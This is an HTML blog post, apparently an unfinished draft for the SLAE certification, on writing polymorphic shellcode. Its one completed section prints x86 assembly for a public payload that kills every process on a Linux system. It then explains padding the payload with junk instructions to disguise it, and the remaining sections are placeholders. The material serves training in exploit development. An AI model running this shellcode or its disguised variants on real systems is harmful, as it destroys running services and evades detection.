<!DOCTYPE HTML>
<!--
	Solution for SLAE question #6

-->
<html>
	<head>
		<link rel="icon" href="../images/favicon.ico">
		<title>The Post</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="../assets/css/main.css" />
		<link rel="stylesheet" href="../assets/css/atom-one-dark-reasonable.min.css">
		<script src="../assets/js/highlight.pack.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
		<noscript><link rel="stylesheet" href="../assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<a class="logo">The Defense</a>
					</header>

				<!-- Nav -->
					<nav id="nav">
						<ul class="links">
							<li><a href="../index.html">Home</a></li>
							<li class="active"><a href="../posts.html">Posts</a></li>
							<li><a href="../research.html">Research</a></li>
							<li><a href="../stories.html">Stories</a></li>
							<li><a href="../references.html">Links</a></li>
						</ul>
						<ul class="icons">
							<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
							<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
							<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
							<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
						</ul>
					</nav>

				<!-- Main -->
					<div id="main">
						<div class="wrapper">

						<!-- Post -->

									<!--
									Post body goes here.
									-->
                  <!--
                  Solving slae question 6
                  -->
                  <section class="post">
                    <body>
                      <article id="first-post">
												<a href="index.html"><img src="../images/michst.jpg" class="avatar" alt="avatar"> </img></a>
                        <h2>&emsp; Creating Polymorphic Shellcode</h2>
												<h5>&emsp; &emsp; &emsp; &emsp; November 14, 2020</h5>
                        <div class="box">

													<br><h2>Contents</h2>
													<a href="#Kill" style="color:blue;">Kill Process</a><br>
													<a href="#Assembly" style="color:blue;">Writing the Assembly</a><br>
													<a href="#Demonstration" style="color:blue;">Demonstration</a><br>
													<a href="#Troubleshooting" style="color:blue;">Troubleshooting</a><br>
													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>

													<p>
														&emsp; &emsp;This post involves creating polymorphic versions of three shellcode samples from
														<a href="http://shell-storm.org/shellcode/" target="_blank" style="color:blue;">Shell-Storm</a>.
														 &nbsp;Some background of polymorphism will help provide context to everything later.<br>
														&emsp; &emsp;
											 	</p>
												<center><div class="image post"><img src="../images/slae/assignment6/1-reverse-shell.png" alt="" /></div></center><br>
												<br>


			<br><section id="Kill"><h2>Kill Process</h2></section>

											<p>
												The first payload kills all processes using the <a href="https://man7.org/linux/man-pages/man2/kill.2.html" target="_blank" style="color:blue;"><i>kill()</i></a> system call (syscall).
												 &nbsp;Its source code can be found <a href="http://shell-storm.org/shellcode/files/shellcode-212.php" target="_blank" style="color:blue;">here</a>.
											</p>

											<pre>
												<code class="x86asm" style=display:block;white-space:pre-wrap>
	push byte 37
	pop eax         ; eax = sys_kill syscall
	push byte -1
	pop ebx         ; ebx = 0xff. Send kill() to all processes
	push byte 9
	pop ecx         ; ecx = 0x9 = SIGKILL
	int 0x80
												</code>
											</pre>

											<p>
											After compiling and dumping, the shellcode size is indeed 11 bytes long.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment6/2-original-size.png" alt="" /></div></center><br>

											<p>
											Create a new version of the assembly and add garbage instructions. &nbsp; &nbsp;To meet the 150% original size requirement, the size should be no larger than 16 bytes. &nbsp;As discussed at the beginning,
											the intent is to obfuscate activity and reach the same objective.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment6/3-new-payload.png" alt="" /></div></center><br>

											<p>
											Compile and dump the new version to confirm a 15 byte size! &nbsp;This meets the requirement of being within 150% of the original size.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment6/4-new-size.png" alt="" /></div></center><br>

											<p>
											Dump the shellcode again without the special instruction for normal single-byte visibility. &nbsp;Since the shellcode can have 1 more byte up to 16 bytes, another single byte instruction
											can be added.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment6/5-objdump-normal.png" alt="" /></div></center><br>

											<p>
											Notice the decrement instruction is only one byte. &nbsp;A similar adjustment can be made to the <i>ecx</i> register value for example. &nbsp;Increment the value to 0x9 popping 0x8 into
											 <i>ecx</i>. &nbsp;This will make the total payload size 16 bytes.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment6/6-shellcode-tweak.png" alt="" /></div></center><br>







			<br><section id="Assembly"><h2>Writing the Assembly</h2></section>

									<p>
										&emsp; &emsp;Writing assembly
									</p>
									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>





			<br><section id="Demonstration"><h2>Demonstration</h2></section>
										<!--
										OBJDUMP Special Command:
										objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
										-->
									<p>
										&emsp; &emsp;Demonstrate shellcode here
									</p>
									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>





			<br><section id="Debugging"><h2>Debugging</h2></section>

									<p>
										&emsp; &emsp;Debugging and Troubleshooting
									</p>
									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>




		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>

									<p>
										&emsp; &emsp;Conclusion goes here
									</p>
									<center><div class="image post"><img src="../images/slae/assignment6/.png" alt="" /></div></center><br>





									<p>
										The source code for this assignment as well as other SLAE assignments is here:
										<a href="https://github.com/jpc0016/SLAE-code" target="_blank" style="color:blue;">https://github.com/jpc0016/SLAE-code</a>
									</p>

									<p>
									This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
									<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank" style="color:blue;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br>

									Student ID: PA-15981
									</p>


                        </div>

                      </article>
                    </body>
                  </section>








									<!--
									End post body
									-->

									<!--
									NEW POSTS GO ABOVE THIS LINE
									-->






									<!-- Remove Pagination
							<div class="pagination"><a href="#"> 1 </a></div>
							<div class="pagination"><a href="#"> 2 </a></div>
							<div class="pagination"><a href="#"> 3 </a></div>
							<div class="pagination"><a href="#"> 4 </a></div>
							<div class="pagination"><a href="#"> 5 </a></div>-->
							</div>
					</div>

				<!-- Footer -->
					<footer id="footer">

						<section class="split contact">

							<section>
								<h3>Social</h3>
								<ul class="icons alt">
									<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
									<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
									<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
									<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
								</ul>
							</section>
						</section>
					</footer>

				<!-- Copyright -->
					<div id="copyright">
						<ul><li>&copy; Untitled</li><li>Design: <a href="https://html5up.net" target="_blank">HTML5 UP</a></li></ul>
					</div>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrollex.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</html>
